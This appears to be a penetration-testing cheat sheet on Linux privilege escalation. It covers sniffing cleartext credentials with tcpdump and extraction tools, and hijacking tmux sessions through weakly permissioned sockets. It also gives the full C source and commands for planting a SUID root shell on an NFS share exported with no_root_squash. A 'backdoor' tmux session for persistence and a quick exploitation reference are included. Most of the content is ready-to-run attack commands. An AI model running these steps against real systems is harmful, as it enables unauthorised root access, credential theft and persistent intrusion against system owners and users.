# 🔧 Miscellaneous Techniques

## 🎯 Overview

Additional Linux privilege escalation techniques including traffic capture, NFS exploitation, and tmux session hijacking for comprehensive privilege escalation coverage.

## 📡 Passive Traffic Capture

### Network Sniffing for Credentials
```bash
# Check if tcpdump available and usable
which tcpdump
tcpdump --version

# Capture network traffic
tcpdump -i any -w capture.pcap

# Real-time credential hunting
tcpdump -i any -A | grep -E "(password|user|login|auth)"

# Capture specific protocols
tcpdump -i any port 21    # FTP
tcpdump -i any port 23    # Telnet  
tcpdump -i any port 80    # HTTP
```

### Tools for Credential Extraction
```bash
# net-creds - extract credentials from pcap
python net-creds.py capture.pcap

# PCredz - real-time credential extraction
python PCredz.py -i eth0

# Manual analysis
strings capture.pcap | grep -i "password\|user"
```

## 🗂️ Weak NFS Privileges

### NFS Export Enumeration
```bash
# Check NFS exports
showmount -e target_ip

# Example output:
# /tmp             *
# /var/nfs/general *
```

### Check NFS Configuration
```bash
# View NFS exports configuration
cat /etc/exports

# Look for dangerous options:
# no_root_squash - Root on client = root on server
# Example: /tmp *(rw,no_root_squash)
```

### NFS Privilege Escalation
```bash
# 1. Create SUID shell on attacker machine (as root)
cat > shell.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
EOF

# 2. Compile shell
gcc shell.c -o shell

# 3. Mount NFS share on attacker machine (as root)
sudo mount -t nfs target_ip:/tmp /mnt

# 4. Copy shell and set SUID
sudo cp shell /mnt/
sudo chmod u+s /mnt/shell

# 5. Execute SUID shell on target
./shell  # Now running as root
```

## 📺 Tmux Session Hijacking

### Find Tmux Sessions
```bash
# Check for running tmux processes
ps aux | grep tmux

# Look for tmux sockets
ls -la /tmp/tmux-*
find / -name "*tmux*" 2>/dev/null

# Check socket permissions
ls -la /shareds  # Custom socket location
```

### Session Hijacking
```bash
# List available sessions
tmux list-sessions

# Attach to existing session
tmux attach-session -t session_name

# Attach to socket with custom path
tmux -S /shareds attach

# Example: If socket has weak permissions
# srw-rw---- 1 root devs 0 Sep 1 06:27 /shareds
# And you're in devs group: tmux -S /shareds
```

### Create Hijackable Session (for persistence)
```bash
# Create shared session as privileged user
tmux -S /tmp/shared new -s backdoor
chown root:group /tmp/shared

# Later hijack as group member
tmux -S /tmp/shared attach
```

## 🔍 Detection & Enumeration

### Miscellaneous Techniques Check
```bash
#!/bin/bash
echo "=== MISCELLANEOUS TECHNIQUES ENUMERATION ==="

echo "[+] Network capture capabilities:"
which tcpdump wireshark tshark 2>/dev/null

echo "[+] NFS exports (if NFS client available):"
which showmount 2>/dev/null && echo "Can enumerate NFS"

echo "[+] Running tmux sessions:"
ps aux | grep tmux

echo "[+] Tmux sockets:"
find / -name "*tmux*" 2>/dev/null | head -5

echo "[+] Network file shares:"
mount | grep -E "(nfs|cifs|smb)"

echo "[+] Interesting network connections:"
netstat -an | grep -E ":21|:23|:80|:139|:445|:2049"
```

### NFS Specific Enumeration
```bash
# Check for NFS mounts
mount | grep nfs

# NFS exports on localhost
showmount -e localhost
showmount -e 127.0.0.1

# Check /etc/exports for misconfigurations
cat /etc/exports | grep "no_root_squash"
```

## 🚀 Quick Exploitation Reference

### Immediate Opportunities
```bash
# Tmux session hijack
ps aux | grep tmux && ls -la /tmp/tmux-* /shareds 2>/dev/null

# NFS no_root_squash check
showmount -e localhost | grep -q "/" && cat /etc/exports

# Traffic capture test
timeout 10 tcpdump -i any -c 10 2>/dev/null && echo "Traffic capture possible"
```

### Emergency Techniques
```bash
# Quick tmux hijack
tmux list-sessions 2>/dev/null && tmux attach

# NFS quick check
mount | grep nfs && ls -la /mnt/nfs/ 2>/dev/null

# Basic traffic monitoring
tcpdump -i any -A -c 20 | grep -i "password\|login"
```

## 🔑 Key Points

### Traffic Capture Value
- **Cleartext protocols** - HTTP, FTP, Telnet, SMTP
- **Authentication hashes** - NTLM, Kerberos for cracking
- **SNMP community strings** - Network device access
- **Database connections** - Application credentials

### NFS Exploitation Impact
- **SUID binary upload** - Direct root privilege escalation
- **Configuration modification** - System file access
- **Data exfiltration** - Sensitive file access

### Tmux Session Benefits
- **Inherited privileges** - Session creator's permissions
- **Persistent access** - Session survives disconnection
- **Command history** - Previous commands and data
- **Active processes** - Running privileged tasks

---

*Miscellaneous techniques cover edge cases and specialized scenarios - traffic capture, NFS misconfigurations, and session hijacking provide additional privilege escalation vectors in specific environments.* 